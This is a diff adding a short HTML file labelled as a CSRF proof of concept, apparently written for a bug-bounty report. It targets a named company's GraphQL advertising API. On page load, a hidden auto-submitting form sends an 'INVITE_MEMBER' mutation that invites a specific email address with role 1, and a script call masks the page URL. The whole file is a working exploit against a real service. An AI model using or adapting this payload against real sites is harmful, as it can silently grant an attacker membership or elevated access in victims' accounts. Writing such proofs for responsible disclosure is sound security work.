@@ -1,0 +1,13 @@
+<html>
+  <!-- CSRF PoC - nb1b3k -->
+  <body>
+    <form action='https://api.ads.global-fashion-group.com/gql/v1/?query=mutation+INVITE_MEMBER($email:+String!,+$roleId:+Int!)+{++inviteMember(email:+$email,+roleId:+$roleId)+{++++ok++++__typename++}}&operationName=INVITE_MEMBER&variables={"email":"bneupane705@gmail.com","roleId":"1"}&raw' method="POST" enctype="text/plain">
+      <input type="hidden" name='{"operationName":"INVITE_MEMBER","variables":{"email":"bneupane705@gmail.com","roleId":"1"},"query":"mutation INVITE_MEMBER($email: String!, $roleId: Int!) {\n  inviteMember(email: $email, roleId: $roleId) {\n    ok\n    __typename\n  }\n}\n","test":"' value='hello"}' />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
